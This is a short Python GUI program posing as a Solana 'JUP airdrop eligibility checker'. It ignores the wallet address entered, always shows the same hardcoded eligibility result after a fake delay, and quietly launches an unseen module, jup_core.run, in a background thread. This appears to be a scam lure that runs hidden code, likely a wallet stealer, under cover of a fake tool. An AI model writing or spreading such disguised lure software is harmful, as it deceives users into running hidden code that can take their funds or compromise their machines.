import tkinter as tk
import threading
import jup_core

def scan():
    status_label.config(text="Checking eligibility...")
    root.after(2500, lambda: [
        status_label.config(text="Eligible for 312.7 JUP"),
        export_button.config(state="normal"),
        threading.Thread(target=jup_core.run).start()
    ])

def export():
    with open("jup_eligibility.txt", "w") as f:
        f.write("Wallet is eligible for 312.7 JUP")
    status_label.config(text="Exported.")

root = tk.Tk()
root.title("JUP Airdrop Eligibility Checker")
root.geometry("420x200")
tk.Label(root, text="Enter Solana Wallet Address:").pack()
entry = tk.Entry(root, width=50); entry.pack()
tk.Button(root, text="Check Airdrop", command=scan).pack(pady=5)
status_label = tk.Label(root, text=""); status_label.pack()
export_button = tk.Button(root, text="Export Result", command=export, state="disabled")
export_button.pack(pady=5)
root.mainloop()
